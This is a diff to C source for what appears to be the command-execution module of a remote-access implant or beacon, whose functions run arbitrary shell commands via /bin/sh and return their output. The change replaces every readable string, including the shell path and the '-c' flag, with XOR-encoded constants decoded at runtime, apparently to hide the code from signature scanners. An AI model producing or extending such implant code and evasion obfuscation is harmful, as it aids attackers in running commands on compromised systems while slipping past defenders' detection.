@@ -9,6 +9,8 @@
 #include <time.h>
 #include "exec.h"
 #include "beacon.h"
+#include "util/obf.h"
+#include "obf_strings.h"
 
 /* ---- shared pipe/read loop used by both exec variants ---- */
 
@@ -59,8 +61,9 @@ static char *_exec_read_pipe(int pipefd_read, pid_t pid, size_t *out_len) {
         usleep(50000);
         waitpid(pid, NULL, WNOHANG);
         waitpid(pid, NULL, 0);
-        const char *tmsg = "\n[command timed out after 30s]";
-        size_t tlen = strlen(tmsg);
+        char tmsg[ENC_LX_CMD_TIMEOUT_LEN + 1];
+        xor_dec(tmsg, ENC_LX_CMD_TIMEOUT, ENC_LX_CMD_TIMEOUT_LEN);
+        size_t tlen = ENC_LX_CMD_TIMEOUT_LEN;
         if (buf_len + tlen < buf_cap) {
             memcpy(buf + buf_len, tmsg, tlen);
             buf_len += tlen;
@@ -93,7 +96,9 @@ static char *_exec_read_pipe(int pipefd_read, pid_t pid, size_t *out_len) {
 char *exec_command_shell(const char *cmd, size_t *out_len) {
     int pipefd[2];
     if (pipe(pipefd) < 0) {
-        char *err = strdup("fork failed: pipe error");
+        char emsg[ENC_LX_FORK_PIPE_ERR_LEN + 1];
+        xor_dec(emsg, ENC_LX_FORK_PIPE_ERR, ENC_LX_FORK_PIPE_ERR_LEN);
+        char *err = strdup(emsg);
         *out_len = strlen(err);
         return err;
     }
@@ -102,7 +107,9 @@ char *exec_command_shell(const char *cmd, size_t *out_len) {
     if (pid < 0) {
         close(pipefd[0]);
         close(pipefd[1]);
-        char *err = strdup("fork failed");
+        char emsg[ENC_LX_FORK_FAILED_LEN + 1];
+        xor_dec(emsg, ENC_LX_FORK_FAILED, ENC_LX_FORK_FAILED_LEN);
+        char *err = strdup(emsg);
         *out_len = strlen(err);
         return err;
     }
@@ -112,7 +119,11 @@ char *exec_command_shell(const char *cmd, size_t *out_len) {
         dup2(pipefd[1], STDOUT_FILENO);
         dup2(pipefd[1], STDERR_FILENO);
         close(pipefd[1]);
-        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
+        char sh_path[ENC_BIN_SH_LEN + 1];
+        xor_dec(sh_path, ENC_BIN_SH, ENC_BIN_SH_LEN);
+        char dash_c[ENC_LX_DASH_C_LEN + 1];
+        xor_dec(dash_c, ENC_LX_DASH_C, ENC_LX_DASH_C_LEN);
+        execl(sh_path, "sh", dash_c, cmd, (char *)NULL);
         _exit(127);
     }
 
@@ -161,14 +172,18 @@ char *exec_command(const char *cmd, size_t *out_len) {
     int argc = _parse_argv(cmd, argv, 128);
 
     if (argc == 0) {
-        char *err = strdup("exec: empty command");
+        char emsg[ENC_LX_EXEC_EMPTY_LEN + 1];
+        xor_dec(emsg, ENC_LX_EXEC_EMPTY, ENC_LX_EXEC_EMPTY_LEN);
+        char *err = strdup(emsg);
         *out_len = strlen(err);
         return err;
     }
 
     int pipefd[2];
     if (pipe(pipefd) < 0) {
-        char *err = strdup("fork failed: pipe error");
+        char emsg[ENC_LX_FORK_PIPE_ERR_LEN + 1];
+        xor_dec(emsg, ENC_LX_FORK_PIPE_ERR, ENC_LX_FORK_PIPE_ERR_LEN);
+        char *err = strdup(emsg);
         *out_len = strlen(err);
         return err;
     }
@@ -177,7 +192,9 @@ char *exec_command(const char *cmd, size_t *out_len) {
     if (pid < 0) {
         close(pipefd[0]);
         close(pipefd[1]);
-        char *err = strdup("fork failed");
+        char emsg[ENC_LX_FORK_FAILED_LEN + 1];
+        xor_dec(emsg, ENC_LX_FORK_FAILED, ENC_LX_FORK_FAILED_LEN);
+        char *err = strdup(emsg);
         *out_len = strlen(err);
         return err;
     }
